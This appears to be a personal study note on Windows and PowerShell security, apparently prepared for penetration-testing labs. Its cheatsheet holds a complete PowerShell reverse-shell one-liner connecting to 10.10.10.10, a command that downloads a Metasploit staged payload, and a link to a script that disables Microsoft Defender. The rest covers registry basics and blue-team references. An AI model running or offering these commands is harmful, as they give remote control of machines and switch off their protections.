### Things to learn
C#, Sysinternals, Windows Audit logs, 

### Common commands cheatsheet
- Download a file ```(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe','msfstaged.exe')```
- Execute powershell code from URL - 
- Turn off MS protections using a bat ```https://raw.githubusercontent.com/swagkarna/Defeat-Defender-V1.2.0/main/Defeat-Defender.bat```
- Powershell reverse shells - https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1, ```$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()```

### Windows Registry
- Gui tool  -  Registry Editor (regedit)
- User level  -  HKEY_CURRENT_USER (HKCU)
- Machine level  -  HKEY_LOCAL_MACHINE (HKLM)  -  Needs admin privs to edit

# Important notes
- WMIC will be depricated, Miscorosft is suggesting to stick witk powershell
- SANS powershell course material  -  https://blueteampowershell.com

# Powershell for Defense

# Windows security
MITRE's ATT&CK Matrix for Windows
